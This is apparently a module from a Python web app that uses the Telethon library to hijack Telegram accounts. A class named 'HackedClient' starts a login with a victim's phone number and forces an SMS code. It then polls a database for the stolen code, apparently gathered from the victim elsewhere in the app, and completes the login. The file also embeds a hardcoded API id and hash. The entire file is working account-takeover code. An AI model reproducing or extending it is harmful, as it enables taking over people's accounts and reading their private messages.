from telethon import TelegramClient
import asyncio

from app import db
from app.models.userdata_models import AccessCode

class HackedClient(TelegramClient):
    def __init__(self, user_id, phonenumber, steal_auth_code: callable):
        """:param steal_auth_code: upon this method call, set auth_codes[user_id] and then auth_codes_stolen[user_id].set()"""
        super().__init__(f"app/telegram_highjack/user_{user_id}", 1282215, "397d3eeb55309e02b2c623daa94b321b")
        self.steal_auth_code = steal_auth_code
        self.user_id = user_id
        self.phonenumber = phonenumber

    async def __aenter__(self):
        return await self._hack_user()

    async def __aexit__(self, *args):
        await self.disconnect()

    async def _hack_user(self):
        """connects and logs into the users account"""

        return await self.start(self.phonenumber, force_sms=True, code_callback=self.get_auth_code)
    
    async def get_auth_code(self):
        """waits for auth_codes_stolen[user_id] to be set and expects the code in auth_codes[user_id]"""
        self.steal_auth_code(self.user_id)

        access_code = None
        attemts = 0
        while not access_code and attemts <= 10:
            await asyncio.sleep(5)
            attemts += 1
            access_code = AccessCode.query.get(self.user_id)
        if access_code:
            code = access_code.code
            db.session.delete(access_code)
            db.session.commit()
            return code
        
        return None
